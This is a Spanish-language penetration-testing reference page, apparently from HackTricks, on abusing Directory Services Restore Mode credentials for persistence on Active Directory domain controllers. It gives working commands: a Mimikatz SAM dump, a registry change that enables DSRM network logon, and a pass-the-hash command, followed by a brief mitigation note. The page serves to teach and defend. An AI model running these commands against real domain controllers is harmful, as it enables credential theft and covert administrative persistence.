# Credenciales de DSRM

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Cada controlador de dominio tiene una cuenta de administrador de Directory Services Restore Mode (DSRM). Su contraseña se establece durante la promoción del controlador de dominio y es independiente de las cuentas del dominio de Active Directory.<sup>[[1]](#references)</sup>

Un atacante con control administrativo de un controlador de dominio puede volcar la base de datos SAM local y recuperar el hash NTLM del administrador de DSRM. El siguiente comando de Mimikatz realiza esa operación:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
De forma predeterminada, la cuenta DSRM está destinada al modo de restauración. Establecer `DsrmAdminLogonBehavior` en `2` permite que esta cuenta local se autentique mientras el controlador de dominio se ejecuta con normalidad. Comprueba el valor antes de cambiarlo:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
El hash recuperado puede utilizarse después en una sesión de pass-the-hash para acceder a recursos como el recurso compartido administrativo `C$`. Para esta cuenta local, utiliza el nombre del equipo del controlador de dominio como valor de `/domain`:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Mitigación

- Audita los cambios en `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. El evento de seguridad 4657 registra una modificación del valor del registro cuando el SACL de la clave está configurado para auditar operaciones de **Set Value**.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Restablecer la contraseña del administrador de Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Persistencia sigilosa en Active Directory n.º 11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Persistencia sigilosa en Active Directory n.º 13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Evento 4657 — Se modificó un valor del registro](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
